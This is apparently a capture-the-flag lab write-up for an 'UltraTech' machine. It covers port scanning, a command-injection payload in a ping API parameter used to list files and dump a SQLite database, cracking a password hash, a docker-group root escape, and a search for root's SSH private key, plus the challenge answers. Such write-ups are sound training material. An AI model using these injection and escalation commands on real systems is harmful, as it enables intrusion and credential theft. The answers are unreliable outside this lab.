# UltraTech

## It's Enumeration Time!

IP address at my time is `10.10.253.147`

Doing nmap scan for checking ports and services `nmap -p- -sC -sV 10.10.253.147`

![image](https://github.com/user-attachments/assets/d8d09f3a-f7c6-4bba-9986-eb8e3280322d)

### Answer the questions below

1. Which software is using the port 8081?

Node.js

2. Which other non-standard port is used?

31331

3. Which software using this port?

Apache

4. Which GNU/Linux distribution seems to be used?

Ubuntu

5. The software using the port 8081 is a REST api, how many of its routes are used by the web application?

Doing gobuster scan to check the directories that the port 8081 uses

`gobuster dir -u http://10.10.253.147:8081 -w /usr/share/wordlists/dirb/common.txt`

![image](https://github.com/user-attachments/assets/e55980a0-3ba0-4f09-9580-d8d968628b37)

There was only /auth but I assume that the /auth and /ping directories are used 

**Answer**: 2

## Let the fun begin

### Answer the questions below

1. There is a database lying around, what is its filename?

I go to the port 31331 there is an UltraTech page of Apache server

Doing the gobuster scan `gobuster dir -u http://10.10.253.147:31331 -w /usr/share/wordlists/dirb/common.txt`

![image](https://github.com/user-attachments/assets/70ee7b4e-4546-49f1-a04c-b9c480c119a5)

Going to the robots.txt gives me a sitemap

![image](https://github.com/user-attachments/assets/39a71004-5e31-4796-906a-6fbaf19a0113)

Checking these pages are just normal pages of UltraTech page

![image](https://github.com/user-attachments/assets/570c9bb3-f14f-46dd-a333-39a5edf739ac)

Checking the js page from the gobuster

![image](https://github.com/user-attachments/assets/47033d7c-8228-4613-a77e-6ac71518929c)

Checking the api.js, The `checkAPIStatus()` function in api.js appears to execute a `ping` command using a user-supplied IP address. If this input is not properly sanitized, it may lead to a command injection vulnerability, allowing an attacker to execute arbitrary system commands.

![image](https://github.com/user-attachments/assets/ec9ac329-c8ae-487f-acc4-da2887644203)

As the checkAPIStatus uses the IP Address and port 8081

Specifying the IP address by self  and checking the result

`http://10.10.253.147:8081/ping?ip=10.10.253.147`

![image](https://github.com/user-attachments/assets/7c3f49f5-26c3-4c30-a7c7-7d38a36748ad)

So it gives the result of the ping command meaning we can change the command

Using the ls command `http://10.10.253.147:8081/ping?ip='ls'`

![image](https://github.com/user-attachments/assets/dfcbf0ab-f768-4916-94af-68f7ff18fe27)

**Answer**: utech.db.sqlite

2. What is the first user's password hash?

Checking the contents of the database

`http://10.10.253.147:8081/ping?ip='cat utech.db.sqlite'`

![image](https://github.com/user-attachments/assets/a5688a6e-f5ca-451e-95a2-3941e25c45a5)

We get the hash of the r00t `f357a0c52799563c7c7b76c1e7543a32`

3. What is the password associated with this hash?

Cracking the hash in Crackstation website

**Answer**: n100906

## The root of all evil

SSH connecting to r00t `ssh r00t@10.10.253.147`

As we are r00t not root, so checking the permissions that the user r00t has, `sudo -l`

![image](https://github.com/user-attachments/assets/0ce2a2ea-3ab7-4b8b-9b28-161c6424717f)

By the `id` command, we see that we are in the docker group

Getting a root shell through the docker container `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

This command runs an Alpine Docker container, mounts (making one filesystem accessible inside another) the host's entire filesystem at `/mnt`, and then uses `chroot` to enter the host system's root environment, giving you a shell with host-level access.

![image](https://github.com/user-attachments/assets/23f7384d-1478-4ebc-8a33-2da0c4316a4e)

It is unable to get the image, so checking the existing images `docker ps -a`

![image](https://github.com/user-attachments/assets/aa38fc42-dcd0-46be-be4b-b5b473385a31)

We see that the image is in bash so replacing alpine to bash `docker run -v /:/mnt --rm -it bash chroot /mnt sh`

Then we get the root shell

![image](https://github.com/user-attachments/assets/922582f8-ec19-4a06-955b-fd1696536435)

Finding the id_rsa and checking the contents of id_rsa

`find / -name id_rsa 2>/dev/null`

![image](https://github.com/user-attachments/assets/7edbc7f7-e083-44a9-92af-4a75a7022bb7)

### Answer the questions below

What are the first 9 characters of the root user's private SSH key?

MIIEogIBA
